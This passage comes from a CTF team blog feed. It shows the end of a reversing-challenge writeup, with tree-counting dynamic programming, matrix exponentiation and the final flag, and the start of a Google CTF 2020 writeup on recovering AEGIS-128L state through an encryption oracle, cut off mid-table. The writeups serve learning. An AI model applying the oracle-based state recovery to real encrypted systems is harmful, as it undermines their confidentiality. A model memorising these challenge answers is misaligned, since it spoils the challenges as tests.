&lt;pre&gt;&lt;code class=&#34;language-viz-dot&#34; data-lang=&#34;viz-dot&#34;&gt;digraph {
  node[shape=point]
  edge[arrowhead=false]
  
  t0_0 -&amp;gt; t0_1 
  t0_1 -&amp;gt; t0_2 
  
  t3_0 -&amp;gt; t3_1 
  t3_1 -&amp;gt; t3_2 
  t3_1 -&amp;gt; t3_3 
  
  t4_0 -&amp;gt; t4_1 
  t4_1 -&amp;gt; t4_2 
  t4_1 -&amp;gt; t4_3 
  t4_1 -&amp;gt; t4_4 
  
  t1_0 -&amp;gt; t1_1 
  t1_0 -&amp;gt; t1_2 
  t1_1 -&amp;gt; t1_3 
  t1_2 -&amp;gt; t1_4 
  
  t2_0 -&amp;gt; t2_1 
  t2_0 -&amp;gt; t2_2 
  t2_0 -&amp;gt; t2_3 
  t2_1 -&amp;gt; t2_4 
  t2_2 -&amp;gt; t2_5 
  t2_3 -&amp;gt; t2_6 
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And $g(3) = 15$. They are:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-viz-dot&#34; data-lang=&#34;viz-dot&#34;&gt;digraph {
  node[shape=point]
  edge[arrowhead=false]
  
  t0_0 -&amp;gt; t0_1 
  t0_1 -&amp;gt; t0_2 
  t0_2 -&amp;gt; t0_3 
  
  t5_0 -&amp;gt; t5_1 
  t5_1 -&amp;gt; t5_2 
  t5_2 -&amp;gt; t5_3 
  t5_2 -&amp;gt; t5_4 
  
  t6_0 -&amp;gt; t6_1 
  t6_1 -&amp;gt; t6_2 
  t6_2 -&amp;gt; t6_3 
  t6_2 -&amp;gt; t6_4 
  t6_2 -&amp;gt; t6_5 
  
  t3_0 -&amp;gt; t3_1 
  t3_1 -&amp;gt; t3_2 
  t3_1 -&amp;gt; t3_3 
  t3_2 -&amp;gt; t3_4 
  t3_3 -&amp;gt; t3_5 
  
  t4_0 -&amp;gt; t4_1 
  t4_1 -&amp;gt; t4_2 
  t4_1 -&amp;gt; t4_3 
  t4_1 -&amp;gt; t4_4 
  t4_2 -&amp;gt; t4_5 
  t4_3 -&amp;gt; t4_6 
  t4_4 -&amp;gt; t4_7 
  
  t1_0 -&amp;gt; t1_1 
  t1_0 -&amp;gt; t1_2 
  t1_1 -&amp;gt; t1_3 
  t1_2 -&amp;gt; t1_4 
  t1_3 -&amp;gt; t1_5 
  t1_4 -&amp;gt; t1_6 
  
  t7_0 -&amp;gt; t7_1 
  t7_0 -&amp;gt; t7_2 
  t7_1 -&amp;gt; t7_3 
  t7_2 -&amp;gt; t7_4 
  t7_3 -&amp;gt; t7_5 
  t7_4 -&amp;gt; t7_6 
  t7_4 -&amp;gt; t7_7 
    
  t8_0 -&amp;gt; t8_1 
  t8_0 -&amp;gt; t8_2 
  t8_1 -&amp;gt; t8_3 
  t8_2 -&amp;gt; t8_4 
  t8_3 -&amp;gt; t8_5 
  t8_4 -&amp;gt; t8_6 
  t8_4 -&amp;gt; t8_7 
  t8_4 -&amp;gt; t8_8 

  t9_0 -&amp;gt; t9_1 
  t9_0 -&amp;gt; t9_2 
  t9_1 -&amp;gt; t9_3 
  t9_2 -&amp;gt; t9_4 
  t9_3 -&amp;gt; t9_5 
  t9_3 -&amp;gt; t9_6 
  t9_4 -&amp;gt; t9_7 
}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code class=&#34;language-viz-dot&#34; data-lang=&#34;viz-dot&#34;&gt;digraph {
  node[shape=point]
  edge[arrowhead=false]
  
  t10_0 -&amp;gt; t10_1
  t10_0 -&amp;gt; t10_2 
  t10_1 -&amp;gt; t10_3 
  t10_2 -&amp;gt; t10_4 
  t10_3 -&amp;gt; t10_5 
  t10_3 -&amp;gt; t10_6 
  t10_4 -&amp;gt; t10_7 
  t10_4 -&amp;gt; t10_8 
  
  t11_0 -&amp;gt; t11_1 
  t11_0 -&amp;gt; t11_2 
  t11_1 -&amp;gt; t11_3 
  t11_2 -&amp;gt; t11_4 
  t11_3 -&amp;gt; t11_5 
  t11_3 -&amp;gt; t11_6 
  t11_4 -&amp;gt; t11_7 
  t11_4 -&amp;gt; t11_8 
  t11_4 -&amp;gt; t11_9 
  
  t12_0 -&amp;gt; t12_1 
  t12_0 -&amp;gt; t12_2 
  t12_1 -&amp;gt; t12_3 
  t12_2 -&amp;gt; t12_4 
  t12_3 -&amp;gt; t12_5 
  t12_3 -&amp;gt; t12_6 
  t12_3 -&amp;gt; t12_7 
  t12_4 -&amp;gt; t12_8 

  t13_0 -&amp;gt; t13_1 
  t13_0 -&amp;gt; t13_2 
  t13_1 -&amp;gt; t13_3 
  t13_2 -&amp;gt; t13_4 
  t13_3 -&amp;gt; t13_5 
  t13_3 -&amp;gt; t13_6 
  t13_3 -&amp;gt; t13_7 
  t13_4 -&amp;gt; t13_8 
  t13_4 -&amp;gt; t13_9 
 
  t14_0 -&amp;gt; t14_1 
  t14_0 -&amp;gt; t14_2 
  t14_1 -&amp;gt; t14_3 
  t14_2 -&amp;gt; t14_4 
  t14_3 -&amp;gt; t14_5 
  t14_3 -&amp;gt; t14_6 
  t14_3 -&amp;gt; t14_7 
  t14_4 -&amp;gt; t14_8 
  t14_4 -&amp;gt; t14_9 
  t14_4 -&amp;gt; t14_10 

  t2_0 -&amp;gt; t2_1 
  t2_0 -&amp;gt; t2_2 
  t2_0 -&amp;gt; t2_3 
  t2_1 -&amp;gt; t2_4 
  t2_2 -&amp;gt; t2_5 
  t2_3 -&amp;gt; t2_6 
  t2_4 -&amp;gt; t2_7 
  t2_5 -&amp;gt; t2_8 
  t2_6 -&amp;gt; t2_9 
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Cool! Everything checks out! Luckily the memory overflows when $n = 4$, otherwise our OCD would be forcing us to find $g(4)$ and the writeup will be flooded by a large forest.&lt;/p&gt;

&lt;h3 id=&#34;part-iv-algorithms-algorithms-everywhere&#34;&gt;Part IV: Algorithms, algorithms everywhere&lt;/h3&gt;

&lt;p&gt;In this part, harrier and I work on a different topic:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;harrier&#39;s task: Find $g(1337)$.&lt;/li&gt;
&lt;li&gt;Mystiz&#39;s task: Find the flag if harrier has $g(1337)$ computed.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;41-what-is-g1337&#34;&gt;4.1. What is $g(1337)$?&lt;/h4&gt;

&lt;p&gt;To find the number of &lt;em&gt;good&lt;/em&gt; trees of height $h$, we define an auxiliary variable $k$ (interpret it as &lt;em&gt;cooldown&lt;/em&gt;). Here we redefine &lt;em&gt;good&lt;/em&gt; trees again:&lt;/p&gt;

&lt;p&gt;For a ternary tree, it is said to be &lt;em&gt;good&lt;/em&gt; if for every node,&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;[Recovery]&lt;/strong&gt; if $k &amp;gt; 0$: there should be at most one child, and&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;[Fertility]&lt;/strong&gt; if $k = 0$: if there are $c$ children, then each of them has cooldown $k = c-1$.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Simply put, you need to &lt;em&gt;recover&lt;/em&gt; to be &lt;em&gt;fertile&lt;/em&gt;. For instance, the following is a good tree since each of the node with non-zero cooldown has only a child.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-viz-dot&#34; data-lang=&#34;viz-dot&#34;&gt;digraph {
  node[shape=rectangle, style=rounded]
  
  t0 [label=0]
  t1 [label=1]
  t2 [label=1]
  t3 [label=0]
  t4 [label=0]
  
  t0-&amp;gt;t1
  t0-&amp;gt;t2
  t1-&amp;gt;t3
  t2-&amp;gt;t4
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;However, this is not a &lt;em&gt;good&lt;/em&gt; tree since the red node is too fertile:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-viz-dot&#34; data-lang=&#34;viz-dot&#34;&gt;digraph {
  node[shape=rectangle, style=rounded]
  
  t0 [label=0]
  t1 [label=1, style=&amp;#34;filled, rounded&amp;#34;, fillcolor=&amp;#34;#ff000080&amp;#34;]
  t2 [label=1]
  t3 [label=0]
  t4 [label=0]
  t5 [label=0]
  
  t0-&amp;gt;t1
  t0-&amp;gt;t2
  t1-&amp;gt;t3
  t1-&amp;gt;t4
  t2-&amp;gt;t5
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Luckily, we don&#39;t need to count the &lt;em&gt;good&lt;/em&gt; trees one by one. It can be solved by dynamic programming rather easily. Let&#39;s define the state &lt;code&gt;dp[h][k]&lt;/code&gt; to be the number of &lt;em&gt;good&lt;/em&gt; trees if the tree is of depth &lt;code&gt;h&lt;/code&gt; and cooldown &lt;code&gt;k&lt;/code&gt;. Then:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;[Base case]&lt;/strong&gt; &lt;code&gt;dp[0][k] == 1&lt;/code&gt; for every &lt;code&gt;k&lt;/code&gt;,&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;[Transition]&lt;/strong&gt; &lt;code&gt;dp[h][k] == dp[h-1][k-1]&lt;/code&gt; for &lt;code&gt;h, k &amp;gt; 0&lt;/code&gt;, and&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;[Transition]&lt;/strong&gt; &lt;code&gt;dp[h][0] == dp[h-1][0] + dp[h-1][1]**2 + dp[h-1][2]**3&lt;/code&gt; for &lt;code&gt;h &amp;gt; 0&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The first condition is obvious - the only tree with depth 0 is the tree with the only root node. It is &lt;em&gt;good&lt;/em&gt; no matter what the cooldown is.&lt;/p&gt;

&lt;p&gt;For the second condition, it is not difficult to imagine it as an tree that must cooldown. Hence, if $\text{GT}_{hk}$ is a &lt;em&gt;good&lt;/em&gt; tree with height $h&amp;gt;0$ and cooldown $k&amp;gt;0$, then:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-viz-dot&#34; data-lang=&#34;viz-dot&#34;&gt;digraph {
  node[shape=point]
  edge[arrowhead=false]
  x-&amp;gt;st
  subgraph cluster {
    style=filled
    color=lightgray
    label=&amp;#34;GTₕ₋₁,ₖ₋₁&amp;#34;
    labelloc=b
    st[shape=triangle, height=2, label=&amp;#34;&amp;#34;]
  }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;It is a little bit tricky for the third condition. Since it is in the &lt;em&gt;fertile&lt;/em&gt; mode again, we can decide if there are one, two or three children. Then each of the following trees work:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-viz-dot&#34; data-lang=&#34;viz-dot&#34;&gt;digraph {
  node[shape=point]
  edge[arrowhead=false]
  x0-&amp;gt;st0
  subgraph cluster0 {
    style=filled
    color=lightgray
    label=&amp;#34;GTₕ₋₁,₀&amp;#34;
    labelloc=b
    st0[shape=triangle, height=2, label=&amp;#34;&amp;#34;]
  }
  
  x1-&amp;gt;st1:n
  x1-&amp;gt;st2:n
  subgraph cluster1 {
    style=filled
    color=lightgray
    label=&amp;#34;Each subtree is GTₕ₋₁,₁&amp;#34;
    labelloc=b
    st1[shape=triangle, height=2, label=&amp;#34;&amp;#34;]
    st2[shape=triangle, height=2, label=&amp;#34;&amp;#34;]
  }
  
  x2-&amp;gt;st3:n
  x2-&amp;gt;st4:n
  x2-&amp;gt;st5:n
  subgraph cluster2 {
    style=filled
    color=lightgray
    label=&amp;#34;Each subtree is GTₕ₋₁,₂&amp;#34;
    labelloc=b
    st3[shape=triangle, height=2, label=&amp;#34;&amp;#34;]
    st4[shape=triangle, height=2, label=&amp;#34;&amp;#34;]
    st5[shape=triangle, height=2, label=&amp;#34;&amp;#34;]
  }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Hence, if there are &lt;code&gt;k&lt;/code&gt; children, then there are &lt;code&gt;dp[h-1][k-1]**k&lt;/code&gt; choices. Since we are able to pick &lt;code&gt;k = 1, 2, 3&lt;/code&gt;, we can simply sum them up for &lt;code&gt;dp[h][k]&lt;/code&gt;. After all, this is the Python script to compute:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;g&lt;/span&gt;(k: int) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; int:
  &lt;span style=&#34;color:#75715e&#34;&gt;# Base case&lt;/span&gt;
  dp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]]
  &lt;span style=&#34;color:#75715e&#34;&gt;# Transition&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(k):
    dp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append([
      sum([dp[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][i]&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;(i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)]), dp[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], dp[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
    ])
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; dp[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;But the numbers is growing exponentially and finding $g(1337)$ takes eternally. What can we do? Nevermind, we will get back to this shortly.&lt;/p&gt;

&lt;h4 id=&#34;42-fast-sequence-generation&#34;&gt;4.2. Fast sequence generation&lt;/h4&gt;

&lt;p&gt;To compute the values of &lt;code&gt;ecx&lt;/code&gt; and &lt;code&gt;edx&lt;/code&gt;, we can find the number of executed instructions (denote it as $q$). Since the loop is completed every four steps, we can find $s_{\mathbf{floor}(q/4)}$ and $s_{\mathbf{floor}(q/4)+1}$ and perform the remainder of the instructions.&lt;/p&gt;

&lt;p&gt;Let&#39;s get back to the sequence $s_n$:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;$s_0 = \text{82F96AC97429A68B}_{16}$,&lt;/li&gt;
&lt;li&gt;$s_1 = \text{32B9B6BCA55548ED}_{16}$, and&lt;/li&gt;
&lt;li&gt;$s_k = 3 s_{k-2} + 2 s_{k-1} + 4\mod2^{64}$ for $k \geq 2$.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To compute it efficiently, we can rewrite it as a matrix notation:&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[
\begin{bmatrix} s_{k+1} \\ s_k \\ 1 \end{bmatrix}
= \begin{bmatrix} 2 &amp; 3 &amp; 4 \\ 1 &amp; 0 &amp; 0 \\ 0 &amp; 0 &amp; 1\end{bmatrix}
\begin{bmatrix} s_k \\ s_{k-1} \\ 1 \end{bmatrix} \mod 2^{64}.
\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Why? Try the multiplication by yourselves! Anyway, then we are able to compute $s_m$ and $s_{m+1}$ efficiently, since&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[
\begin{bmatrix} s_{m+1} \\ s_m \\ 1 \end{bmatrix}
= \begin{bmatrix} 2 &amp; 3 &amp; 4 \\ 1 &amp; 0 &amp; 0 \\ 0 &amp; 0 &amp; 1\end{bmatrix}^m
\begin{bmatrix} s_1 \\ s_0 \\ 1 \end{bmatrix} \mod 2^{64}.
\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Moreover, since&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[\begin{bmatrix} 2 &amp; 3 &amp; 4 \\ 1 &amp; 0 &amp; 0 \\ 0 &amp; 0 &amp; 1\end{bmatrix}^{2^{64}}
= \begin{bmatrix} 1 &amp; 0 &amp; 0 \\ 0 &amp; 1 &amp; 0 \\ 0 &amp; 0 &amp; 1\end{bmatrix},
\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;the square matrix has order $2^{64}$. That said, we don&#39;t need to find the exact value for $g(1337)$. Instead, we can compute $g(1337)\mod (2^{64}\times4)$. Hereby we need to multiple the number by four, since there are 4 instructions per loop).&lt;/p&gt;

&lt;h3 id=&#34;part-v-the-flagggggggggg&#34;&gt;Part V: The flagggggggggg!&lt;/h3&gt;

&lt;p&gt;After all, we can modify the Python function we had to compute $g(k)\mod 2^{66}$:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;g&lt;/span&gt;(k: int) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; int:
  &lt;span style=&#34;color:#75715e&#34;&gt;# Base case&lt;/span&gt;
  dp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]]
  &lt;span style=&#34;color:#75715e&#34;&gt;# Transition&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(k):
    dp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append([
      sum([dp[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][i]&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;(i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;, dp[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], dp[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
    ])
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; dp[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And &lt;code&gt;g(1337) = 59988074356265869957&lt;/code&gt; pops out at no time. Therefore, we can find $s_{14997018589066467489}$ and $s_{14997018589066467490}$ and proceed one instruction further. We have &lt;code&gt;rdx&lt;/code&gt; being &lt;code&gt;0x62246322232ceabf&lt;/code&gt; and &lt;code&gt;rcx&lt;/code&gt; being &lt;code&gt;0xbf1d9826c054007&lt;/code&gt;!&lt;/p&gt;

&lt;p&gt;Thus &lt;code&gt;p4{62246322232ceabfbf1d9826c054007}&lt;/code&gt; would be the flag, right? NO!&lt;/p&gt;

&lt;p&gt;It was 4:40 am and we were very sleepy. It took us few minutes to figure out that &lt;code&gt;rcx&lt;/code&gt; isn&#39;t composed of 16 hexchars. The correct flag should be &lt;code&gt;p4{62246322232ceabf0bf1d9826c054007}&lt;/code&gt; (note that there is an &lt;em&gt;zero&lt;/em&gt;). Yeah, :checkered_flag: - and we are the first to capture this!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Google CTF 2020: Oracle</title>
      <link>https://b6a.black/posts/2020-08-25-google-ctf-oracle/</link>
      <pubDate>Tue, 25 Aug 2020 16:15:00 +0800</pubDate>
      
      <guid>https://b6a.black/posts/2020-08-25-google-ctf-oracle/</guid>
      <description>&lt;p&gt;I was teamed-up with @blackb6a on Google CTF this time. I have solved 7 challenges alone and 3 challenges with my teammates.&lt;/p&gt;

&lt;p&gt;In particular, &lt;em&gt;Oracle&lt;/em&gt; is a crypto challenge with 13 solves. It has got me spending 12 hours. All in all, it was a great experience in terms of learning, but my liver hurts. This piece of writeup may be &lt;em&gt;very&lt;/em&gt; computation intensive, just because I would like to make everything clear.&lt;/p&gt;

&lt;h2 id=&#34;challenge-summary&#34;&gt;Challenge Summary&lt;/h2&gt;

&lt;p&gt;There are two parts of the challenges. In the first part, we are required to recover an internal state for AEGIS-128L given the encryption oracle. For the second part, we are required to forge a ciphertext given an error oracle from decryption.&lt;/p&gt;

&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;

&lt;h3 id=&#34;part-i-a-brief-summary-for-the-state-in-aegis128l&#34;&gt;Part I: A brief summary for the state in AEGIS-128L&lt;/h3&gt;

&lt;p&gt;AEGIS-128L has an internal state that is initially computed solely by the &lt;em&gt;key&lt;/em&gt; and the &lt;em&gt;IV&lt;/em&gt;. It is of 128 bytes, broken into eight 16-byte blocks. Let&#39;s $S_i$ is updated to $S_{i+1}$ given 32-byte payload $M$. Let&#39;s define $S_i = (s_{i, 0}, s_{i, 1}, ..., s_{i, 7})$ and $M = (m_0, m_1)$. We have:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;$s_{i+1, 0} \leftarrow \text{AESEnc}(s_{i, 7}, s_{i, 0}) \oplus m_0$,&lt;/li&gt;
&lt;li&gt;$s_{i+1, 4} \leftarrow \text{AESEnc}(s_{i, 3}, s_{i, 4}) \oplus m_1$, and&lt;/li&gt;
&lt;li&gt;$s_{i+1, j} \leftarrow \text{AESEnc}(s_{i, j-1}, s_{i, j})$ for $j = 1, 2, 3, 5, 6, 7$.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;But what is &lt;code&gt;AESEnc&lt;/code&gt;? Let&#39;s see the implementation.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;aes_enc&lt;/span&gt;(s: block, t: block) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; block:
  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;Performs the AESENC operation with tables.&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
  t0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (te0[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te1[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te2[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te3[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;]])
  t1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (te0[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te1[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te2[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te3[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]])
  t2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (te0[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te1[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te2[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te3[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]])
  t3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (te0[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te1[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te2[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;]] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; te3[s[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;]])
  s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _block_from_ints([t0, t1, t2, t3])
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; _xor(s, t)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Well... we will go through this later. Let&#39;s introduce how keystreams are generated from the state. It is (relatively) simple. The keystream $(k_{i, 0}, k_{i, 1})$ for the $i$-th round is given by:&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[
k_{i, 0} = (s_{i, 2} \wedge s_{i, 3}) \oplus s_{i, 1} \oplus s_{i, 6}, \\
k_{i, 1} = (s_{i, 6} \wedge s_{i, 7}) \oplus s_{i, 5} \oplus s_{i, 2}.
\]&lt;/span&gt;&lt;/p&gt;

&lt;h3 id=&#34;part-ii-recovering-part-of-the-state&#34;&gt;Part II: Recovering part of the state&lt;/h3&gt;

&lt;p&gt;Now we are given that key and IV are unchanged. This implies that the initial state, i.e., $s_{00}, s_{01}, ..., s_{09}$ are constants too.&lt;/p&gt;

&lt;p&gt;Suppose that we have two 96-byte messages $M^{(1)}$ and $M^{(2)}$ with only the first two blocks are different (Formally, if $M^{(k)} := (m^{(k)}_{00}, m^{(k)}_{01}, ..., m^{(k)}_{21}$), then $m^{(1)}_{ij} = m^{(2)}_{ij}$ if and only if $i \neq 0$).&lt;/p&gt;

&lt;p&gt;The following table summarizes which of the $s_{ij}$&#39;s that would be different (marked by an &lt;code&gt;!&lt;/code&gt;), when encrypting $M^{(1)}$ and $M^{(2)}$ respectively.&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;$i$ \ $j$&lt;/th&gt;
&lt;th&gt;0&lt;/th&gt;
&lt;th&gt;1&lt;/th&gt;
&lt;th&gt;2&lt;/th&gt;
&lt;th&gt;3&lt;/th&gt;
&lt;th&gt;4&lt;/th&gt;
&lt;th&gt;5&lt;/th&gt;
&lt;th&gt;6&lt;/th&gt;
&lt;th&gt;7&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
